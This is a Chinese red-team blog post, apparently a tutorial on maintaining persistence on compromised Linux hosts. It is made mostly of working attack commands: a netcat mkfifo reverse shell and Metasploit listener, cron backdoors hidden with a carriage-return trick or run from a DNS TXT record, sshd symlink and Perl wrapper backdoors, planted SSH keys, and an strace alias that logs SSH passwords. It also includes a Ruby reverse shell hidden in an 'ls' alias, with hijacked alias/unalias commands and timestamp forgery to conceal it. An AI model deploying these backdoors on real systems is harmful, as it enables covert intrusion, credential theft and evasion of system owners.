@@ -1,0 +1,1196 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/blog-32x32.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/blog-16x16.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Persistence,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="本文记录Linux环境下权限维持思路及方法...">
+<meta name="keywords" content="Persistence">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限维持Linux后门篇">
+<meta property="og:url" content="https://l0n9w4y.cc/posts/20809/index.html">
+<meta property="og:site_name" content="L0n9w4y">
+<meta property="og:description" content="本文记录Linux环境下权限维持思路及方法...">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2022-07-31T12:32:34.031Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="权限维持Linux后门篇">
+<meta name="twitter:description" content="本文记录Linux环境下权限维持思路及方法...">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://l0n9w4y.cc/posts/20809/">
+
+
+
+
+
+  <title>权限维持Linux后门篇 | L0n9w4y</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L0n9w4y</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-攻防">
+          <a href="/security/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-navicon"></i> <br>
+            
+            攻防
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://l0n9w4y.cc/posts/20809/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="L0n9w4y">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/hexo.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L0n9w4y">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">权限维持Linux后门篇</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-01-02T21:30:14+08:00">
+                2022-01-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/红队渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">红队渗透</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/红队渗透/权限维持/" itemprop="url" rel="index">
+                    <span itemprop="name">权限维持</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <center>本文记录Linux环境下权限维持思路及方法...</center>
+
+<a id="more"></a>
+<hr>
+<h2 id="0x01-Metasploit"><a href="#0x01-Metasploit" class="headerlink" title="0x01 Metasploit"></a>0x01 Metasploit</h2><h3 id="1-Unix-中反弹shell的paylaod"><a href="#1-Unix-中反弹shell的paylaod" class="headerlink" title="1. Unix 中反弹shell的paylaod"></a>1. Unix 中反弹shell的paylaod</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads | grep &apos;cmd/unix/reverse&apos;</span><br><span class="line"></span><br><span class="line">    cmd/unix/reverse                                    Creates an interactive shell through two inbound connections</span><br><span class="line">    cmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK</span><br><span class="line">    cmd/unix/reverse_bash                               Creates an interactive shell via bash&apos;s builtin /dev/tcp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/tcp feature.</span><br><span class="line">    cmd/unix/reverse_bash_telnet_ssl                    Creates an interactive shell via mkfifo and telnet. This method works on Debian and other systems compiled without /dev/tcp support. This module uses the &apos;-z&apos; option included on some systems to encrypt using SSL.</span><br><span class="line">    cmd/unix/reverse_bash_udp                           Creates an interactive shell via bash&apos;s builtin /dev/udp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/udp feature.</span><br><span class="line">    cmd/unix/reverse_jjs                                Connect back and create a command shell via jjs</span><br><span class="line">    cmd/unix/reverse_ksh                                Connect back and create a command shell via Ksh. Note: Although Ksh is often available, please be aware it isn&apos;t usually installed by default.</span><br><span class="line">    cmd/unix/reverse_lua                                Creates an interactive shell via Lua</span><br><span class="line">    cmd/unix/reverse_ncat_ssl                           Creates an interactive shell via ncat, utilizing ssl mode</span><br><span class="line">    cmd/unix/reverse_netcat                             Creates an interactive shell via netcat</span><br><span class="line">    cmd/unix/reverse_netcat_gaping                      Creates an interactive shell via netcat</span><br><span class="line">    cmd/unix/reverse_nodejs                             Continually listen for a connection and spawn a command shell via nodejs</span><br><span class="line">    cmd/unix/reverse_openssl                            Creates an interactive shell through two inbound connections</span><br><span class="line">    cmd/unix/reverse_perl                               Creates an interactive shell via perl</span><br><span class="line">    cmd/unix/reverse_perl_ssl                           Creates an interactive shell via perl, uses SSL</span><br><span class="line">    cmd/unix/reverse_php_ssl                            Creates an interactive shell via php, uses SSL</span><br><span class="line">    cmd/unix/reverse_python                             Connect back and create a command shell via Python</span><br><span class="line">    cmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.</span><br><span class="line">    cmd/unix/reverse_r                                  Connect back and create a command shell via R</span><br><span class="line">    cmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby</span><br><span class="line">    cmd/unix/reverse_ruby_ssl                           Connect back and create a command shell via Ruby, uses SSL</span><br><span class="line">    cmd/unix/reverse_socat_udp                          Creates an interactive shell via socat</span><br><span class="line">    cmd/unix/reverse_ssh                                Connect back and create a command shell via SSH</span><br><span class="line">    cmd/unix/reverse_ssl_double_telnet                  Creates an interactive shell through two inbound connections, encrypts using SSL via &quot;-z&quot; option</span><br><span class="line">    cmd/unix/reverse_stub                               Creates an interactive shell through an inbound connection (stub only, no payload)</span><br><span class="line">    cmd/unix/reverse_tclsh                              Creates an interactive shell via Tclsh</span><br><span class="line">    cmd/unix/reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn&apos;t usually installed by default</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-msfvenom-生成payload"><a href="#2-msfvenom-生成payload" class="headerlink" title="2. msfvenom 生成payload"></a>2. msfvenom 生成payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p &lt;payload&gt; LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br><span class="line"></span><br><span class="line">msfvenom -p &lt;payload&gt; -e &lt;encoder &gt; -i &lt;encoder times&gt; LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br></pre></td></tr></table></figure>
+
+<p>refer: <a href="https://gitee.com/l0n9/sec-notes/blob/master/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/Metsploit%E5%9F%BA%E7%A1%80%E7%AF%87.md" target="_blank" rel="noopener">https://gitee.com/l0n9/sec-notes/blob/master/Metsploit</a></p>
+<h3 id="3-meterpreter-shell"><a href="#3-meterpreter-shell" class="headerlink" title="3. meterpreter shell"></a>3. meterpreter shell</h3><p>shell升级为 meterpreter shell</p>
+<p>攻击机配置msf 监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload linux/x86/shell/reverse_tcp</span><br><span class="line"></span><br><span class="line">set lport 6666</span><br><span class="line"></span><br><span class="line">set lhost 192.168.1.1</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>目标主机上反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.1.1 6666 &gt; /tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>获取一个普通shell, 在这个shell中输入 background, 在对话中选择 y, 将shell放在了后台</p>
+<p>使用 sessions -u 1 将普通shell提升为 meterpreter shell</p>
+<p>sessions命令查看shell会话，sessions -i id 切换到目标shell</p>
+<h2 id="0x02-计划任务后门"><a href="#0x02-计划任务后门" class="headerlink" title="0x02 计划任务后门"></a>0x02 计划任务后门</h2><h3 id="1-查找计划任务相关文件"><a href="#1-查找计划任务相关文件" class="headerlink" title="1. 查找计划任务相关文件"></a>1. 查找计划任务相关文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1) sudo find / -name &apos;cron*&apos; | egrep -v &apos;man|doc&apos; | sort -u</span><br><span class="line"></span><br><span class="line">2) sudo updatedb &amp;&amp; sudo locate cron | egrep -v &apos;doc|man&apos;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-定时任务文件说明"><a href="#2-定时任务文件说明" class="headerlink" title="2. 定时任务文件说明"></a>2. 定时任务文件说明</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1) 用户允许/禁止配置文件</span><br><span class="line"></span><br><span class="line">- /etc/cron.deny ：用来禁止一些用户使用cron服务的配置文件</span><br><span class="line"></span><br><span class="line">- /etc/cron.allow ：允许一些用户来使用cron服务的配置文件，优先级高</span><br><span class="line"></span><br><span class="line">2) 系统配置项：系统执行的计划任务</span><br><span class="line"></span><br><span class="line">- /etc/crontab </span><br><span class="line"></span><br><span class="line">- /etc/cron.d/</span><br><span class="line"></span><br><span class="line">3) 用户配置项：执行crontab命令操作的目录</span><br><span class="line"></span><br><span class="line">- /var/spool/cron</span><br><span class="line"></span><br><span class="line">4) 其他计划任务文件</span><br><span class="line"></span><br><span class="line">    /etc/cron.daily</span><br><span class="line">    /etc/cron.deny</span><br><span class="line">    /etc/cron.hourly</span><br><span class="line">    /etc/cron.monthly</span><br><span class="line">    /etc/cron.weekly</span><br></pre></td></tr></table></figure>
+
+<p>定时任务在线生成器：<a href="https://crontab.guru/" target="_blank" rel="noopener">https://crontab.guru/</a></p>
+<h3 id="3-计划任务隐藏后门"><a href="#3-计划任务隐藏后门" class="headerlink" title="3. 计划任务隐藏后门"></a>3. 计划任务隐藏后门</h3><p>隐藏思路</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1) 不使用用户cron配置项：避免crontab命令查看计划任务内容</span><br><span class="line"></span><br><span class="line">2) 不使用常用目录及文件如：/var/spool/cron、/etc/crontab等</span><br><span class="line"></span><br><span class="line">3) 劫持/修改系统默认的计划任务文件：伪装文件名/文件位置</span><br><span class="line"></span><br><span class="line">如：/etc/cron.daily 、/etc/cron.hourly目录下自带文件</span><br></pre></td></tr></table></figure>
+
+<p>隐藏技巧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1) 巧妙利用windows中的 \r（ Linux 中显示为M), 导致显示截断，从而隐藏真实的计划任务，使用crontab -e 可以看到</span><br><span class="line"></span><br><span class="line">(crontab -l;printf &quot;*/1 * * * * /root/.devops.sh;\rno crontab for `whoami`%100c\n&quot;)|crontab -</span><br><span class="line"></span><br><span class="line">2) 使用DNS的TXT记录，通过解析这个记录来进行执行，使用linux.org等公共域名进行隐藏</span><br><span class="line"></span><br><span class="line">0 1 * * * /bin/sh -c &quot;sh -c $(dig logging.chat TXT +short @pola.ns.cloudflare.com)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>refer：<a href="https://blog.sucuri.net/2019/05/cronjob-backdoors.html" target="_blank" rel="noopener">https://blog.sucuri.net/2019/05/cronjob-backdoors.html</a></p>
+<h2 id="0x03-SSH系列后门"><a href="#0x03-SSH系列后门" class="headerlink" title="0x03 SSH系列后门"></a>0x03 SSH系列后门</h2><h3 id="1-软链接后门"><a href="#1-软链接后门" class="headerlink" title="1. 软链接后门"></a>1. 软链接后门</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=6666;</span><br><span class="line"></span><br><span class="line">ssh root@x.x.x.x -p 6666</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-SSH-Wapper-后门"><a href="#2-SSH-Wapper-后门" class="headerlink" title="2. SSH Wapper 后门"></a>2. SSH Wapper 后门</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin</span><br><span class="line">vim sshd //编辑sshd内容为以下</span><br><span class="line"></span><br><span class="line">#!/usr/bin/perl</span><br><span class="line">exec&quot;/bin/sh&quot; if(getpeername(STDIN)=~/^..0V/); // \x00\x000V是22222的大端形式</span><br><span class="line">exec&#123;&quot;/usr/bin/sshd&quot;&#125;&quot;/usr/sbin/sshd&quot;,@ARGV;</span><br><span class="line"></span><br><span class="line">重启sshd</span><br><span class="line">service sshd restart</span><br><span class="line"></span><br><span class="line">本机执行</span><br><span class="line">socat STDIO TCP4:127.0.0.1:22,sourceport=22222</span><br><span class="line"></span><br><span class="line">修改源端口</span><br><span class="line">import struct</span><br><span class="line">buffer = struct.pack(&apos;&gt;I&apos;,22222)</span><br><span class="line">print(buffer)</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-SSH公钥后门"><a href="#3-SSH公钥后门" class="headerlink" title="3. SSH公钥后门"></a>3. SSH公钥后门</h3><p>攻击机中使用 ssh-keygen -t rsa 生成公私钥</p>
+<p>将公钥 id_rsa.pub 上传到目标主机，保存为 ~/.ssh/authorized_keys</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user@host</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-SSH-Keylogger"><a href="#4-SSH-Keylogger" class="headerlink" title="4. SSH Keylogger"></a>4. SSH Keylogger</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 利用strace工具获取ssh的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码</span><br><span class="line">alias ssh=&apos;strace -o /tmp/.sshpwd-`date &apos;+%d%h%m%s&apos;`.log -e read.write.connect -s 2048 ssh&apos;</span><br><span class="line"></span><br><span class="line">grep &quot;read(5&quot; /tmp/.sshpwdxxxxxxxx.log</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-alias后门"><a href="#0x04-alias后门" class="headerlink" title="0x04 alias后门"></a>0x04 alias后门</h2><h3 id="1-后门存放位置"><a href="#1-后门存放位置" class="headerlink" title="1. 后门存放位置"></a>1. 后门存放位置</h3><p>系统启动默认加载的配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1) /etc/profile</span><br><span class="line"></span><br><span class="line">【系统级】Linux是一个多用户操作系统。用户登录或切换（即Login shell 启动）时都有一个专用的运行环境，但首先执行 /etc/profile</span><br><span class="line"></span><br><span class="line">2) /etc/bashrc</span><br><span class="line"></span><br><span class="line">【系统级】在 bash shell 打开时运行，修改该文件配置的环境变量将会影响所有用户使用的bash shell</span><br><span class="line"></span><br><span class="line">3) ~/.bashrc</span><br><span class="line"></span><br><span class="line">【用户级】当用户登录时以及每次打开新的shell时该文件都将被读取，不推荐在这里配置用户专用的环境变量，因为每开一个shell，该文件都会被读取一次</span><br><span class="line"></span><br><span class="line">4) ~/.bash_profile &amp;&amp; ~./bash_login</span><br><span class="line"></span><br><span class="line">【用户级】</span><br><span class="line"></span><br><span class="line">如果有其中的一个文件存在的话, 当启动的是一个登录shell时，Bash 会执行该文件而不会执行~/.profile </span><br><span class="line"></span><br><span class="line">如果两个文件都存在的话，Bash 将会优先执行~/.bash_profile 而不是~/.bash_login </span><br><span class="line"></span><br><span class="line">5) ~/.bash_logout</span><br><span class="line"></span><br><span class="line">【用户级】当每次退出系统(退出bash shell)时执行该文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-后门制作"><a href="#2-后门制作" class="headerlink" title="2. 后门制作"></a>2. 后门制作</h3><p>当前用户目录下.bashrc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias ssh=&apos;strace -o /tmp/sshpwd-`date &apos;+%d%h%m%s&apos;`.log -e read,write,connect -s 2048 ssh&apos;</span><br></pre></td></tr></table></figure>
+
+<p>创建alias后门</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1) 受控端创建别名</span><br><span class="line"></span><br><span class="line">alias ls=&quot;alerts()&#123; ls $* --color=auto;ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;&apos;&quot;&apos;&quot;192.168.1.1&quot;&apos;&quot;&apos;&quot;,&quot;&apos;&quot;&apos;&quot;6666&quot;&apos;&quot;&apos;&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;&apos;&quot;&apos;&quot;r&quot;&apos;&quot;&apos;&quot;)&#123;|io|c.print io.read&#125;end&apos;;&#125;;alerts&quot;</span><br><span class="line"></span><br><span class="line">2）攻击端监听本地端口</span><br><span class="line"></span><br><span class="line">nc -lvnp 6666</span><br><span class="line"></span><br><span class="line">3) 受控端执行别名命令，攻击端获得反弹shell</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-后门隐藏"><a href="#3-后门隐藏" class="headerlink" title="3. 后门隐藏"></a>3. 后门隐藏</h3><p>alias命令可以查看当前的别名，会让别名后门暴露。因此需要劫持alias命令，使输出中不显示后门指令。</p>
+<p>另外unalias命令会清除别名，也需要对其进行劫持，避免后门指令的别名被清除。</p>
+<p><strong>1）创建unalias别名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias unalias=&apos;alerts()&#123; if [ $# != 0 ]; then if [ $* != &quot;ls&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&apos;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2) 创建alias的别名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">劫持前先将当前alias结果保存至比较隐蔽的文件</span><br><span class="line">alias &gt; /etc/gnupg/.gnupg</span><br><span class="line"></span><br><span class="line">alias alias=&quot;cat /etc/gnupg/.gnupg&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3) 文件位置隐蔽</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1) 在正常的位置创建合理的文件</span><br><span class="line">vi /etc/yum/yum-update.rc  //创建文件，加入别名设置</span><br><span class="line"></span><br><span class="line">alias ls=&quot;alerts()&#123; ls $* --color=auto;ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;&apos;&quot;&apos;&quot;192.168.1.1&quot;&apos;&quot;&apos;&quot;,&quot;&apos;&quot;&apos;&quot;6666&quot;&apos;&quot;&apos;&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;&apos;&quot;&apos;&quot;r&quot;&apos;&quot;&apos;&quot;)&#123;|io|c.print io.read&#125;end&apos;;&#125;;alerts&quot;</span><br><span class="line"></span><br><span class="line">alias unalias=&apos;alerts()&#123; if [ $# != 0 ]; then if [ $* != &quot;ls&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&apos;</span><br><span class="line"></span><br><span class="line">alias alias=&quot;cat /etc/gnupg/.gnupg&quot;</span><br><span class="line"></span><br><span class="line">2) 将正常文件的时间复制给包含alias的文件</span><br><span class="line"></span><br><span class="line">touch -acmr version-groups.conf yum-update.rc</span><br></pre></td></tr></table></figure>
+
